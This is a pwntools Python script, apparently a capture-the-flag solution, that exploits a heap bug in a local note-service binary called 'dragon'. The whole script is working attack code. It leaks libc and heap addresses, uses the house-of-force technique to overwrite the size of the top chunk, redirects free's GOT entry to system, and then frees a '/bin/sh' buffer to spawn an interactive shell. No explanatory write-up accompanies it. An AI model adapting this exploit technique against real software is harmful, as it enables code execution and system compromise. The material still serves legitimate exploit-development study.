from pwn import *

#context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

cn = process('./dragon')
bin = ELF('./dragon')
libc = ELF('./libc.so')

def add(len_name,name,content):
	sleep(0.01)
	cn.sendline('1')
	cn.recvuntil('size:')
	cn.sendline(str(len_name))
	cn.recvuntil('name:')
	cn.sendline(name)
	assert len(name)<32,'name too long!!'
	cn.recvuntil('content:')
	cn.send(content)

def edit(idx,content):
	sleep(0.01)
	cn.sendline('2')
	cn.recvuntil('id:')
	cn.sendline(str(idx))
	cn.recvuntil('content:')
	cn.send(content)

def delete(idx):
	sleep(0.01)
	cn.sendline('3')
	cn.recvuntil('id:')
	cn.sendline(str(idx))

def print_note(idx):
	sleep(0.01)
	cn.sendline('4')
	cn.recvuntil('id:')
	cn.sendline(str(idx))

def z():
	gdb.attach(cn)
	raw_input()

cn.recvuntil('welcome to my note service')


info('leak libc & system address')
add(32,'a'*31,'a'*24)#0
print_note(0)
cn.recvuntil('content')
cn.recvuntil('a'*24)
data = u64(cn.recv()[:6].ljust(8,'\x00'))
base = data-14-libc.symbols['_IO_default_uflow']
system = base+libc.symbols['system']
success('libc_base: '+hex(base))
success('system: '+hex(system))
delete(0)


info('leak heap_base')
add(32,'b'*31,'b'*0xf+'\n')#0
add(32,'c'*31,'c'*0xf+'\n')#1
delete(1)
edit(0,'b'*0x20)
print_note(0)
cn.recvuntil('content')
cn.recvuntil('b'*32)
data = u64(cn.recvuntil('\n')[:-1].ljust(8,'\x00'))
heap_base = data-0xf0
success('heap_base: '+hex(heap_base))
edit(0,'b'*0x10+p64(0)+p64(33))


info('using house_of_force')
add(32,'E'*31,'e'*16)#1
add(16,'D'*15,'d'*0xf+'\n')#2
edit(2,'/bin/sh\x00'+'bbbbbbbb'+p64(0)+p64(0xffffffffffffffff))
delete(1)
eval_size = 0x6020d0-(heap_base+0x1b0)-0x10#1
cn.sendline('1')
cn.recvuntil('size:')
cn.sendline(str(eval_size))
cn.recvuntil('content:')
cn.send('AAAA')


info('hijack free->system')
name = p64(0x602110)+p64(0)
content = 'A'*16 + p64(bin.got['free'])+p64(bin.got['free'])
cn.sendline('1')
cn.recvuntil('size:')
cn.sendline(str(16))
cn.recvuntil('name:')
cn.send(name)
cn.recvuntil('content:')
cn.send(content)
edit(2,p64(system))


info('get shell :)')
add(16,'asd','/bin/sh\x00')
delete(4)

cn.interactive()